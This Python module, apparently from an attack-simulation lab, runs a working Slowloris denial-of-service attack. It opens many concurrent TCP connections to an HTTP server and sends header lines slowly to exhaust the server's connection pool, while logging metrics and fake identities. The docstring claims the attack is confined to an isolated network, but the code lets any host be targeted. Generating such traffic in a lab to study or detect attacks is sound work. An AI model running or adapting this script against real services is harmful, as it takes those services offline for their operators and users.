"""Slowloris attack simulation module.

Opens many TCP connections to a target HTTP service and sends partial HTTP
headers very slowly, holding connections open to exhaust the target's
connection pool. Confined to the isolated attacker_net/target_net.
"""
import argparse
import asyncio
import os
import random
import time

from common.identity import random_fake_identity
from common.metrics import ACTIVE_WORKERS, ERRORS, REQUESTS_SENT, serve_metrics
from common.recorder import Recorder, SimEvent

ATTACK_TYPE = "slowloris"


async def slow_connection(host: str, port: int, recorder: Recorder, stop_at: float):
    identity = random_fake_identity()
    while time.time() < stop_at:
        try:
            reader, writer = await asyncio.open_connection(host, port)
            writer.write(f"GET /?{random.randint(0, 100000)} HTTP/1.1\r\n".encode())
            writer.write(f"Host: {host}\r\n".encode())
            await writer.drain()
            REQUESTS_SENT.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
            # Trickle a header very slowly to keep the connection half-open.
            while time.time() < stop_at:
                writer.write(f"X-Pad: {random.randint(0, 9999)}\r\n".encode())
                await writer.drain()
                recorder.record(
                    SimEvent(
                        ts=time.time(),
                        attack_type=ATTACK_TYPE,
                        target=f"{host}:{port}",
                        fake_ip=identity.fake_ip,
                        city=identity.city,
                        lat=identity.lat,
                        lon=identity.lon,
                    )
                )
                await asyncio.sleep(random.uniform(5, 15))
            writer.close()
        except Exception:
            ERRORS.labels(attack_type=ATTACK_TYPE, target=f"{host}:{port}").inc()
            await asyncio.sleep(1)


async def run(host: str, port: int, concurrency: int, duration: int, run_name: str):
    recorder = Recorder(run_name)
    stop_at = time.time() + duration
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(concurrency)
    await asyncio.gather(*[slow_connection(host, port, recorder, stop_at) for _ in range(concurrency)])
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(0)
    recorder.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SENTINEL LAB: Slowloris simulation")
    parser.add_argument("--host", default=os.environ.get("TARGET_HOST", "web"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("TARGET_PORT", "8000")))
    parser.add_argument("--concurrency", type=int, default=int(os.environ.get("CONCURRENCY", "100")))
    parser.add_argument("--duration", type=int, default=int(os.environ.get("DURATION", "60")))
    parser.add_argument("--run-name", default=os.environ.get("RUN_NAME", f"slowloris_{int(time.time())}"))
    parser.add_argument("--metrics-port", type=int, default=int(os.environ.get("METRICS_PORT", "9401")))
    args = parser.parse_args()

    serve_metrics(args.metrics_port)
    asyncio.run(run(args.host, args.port, args.concurrency, args.duration, args.run_name))
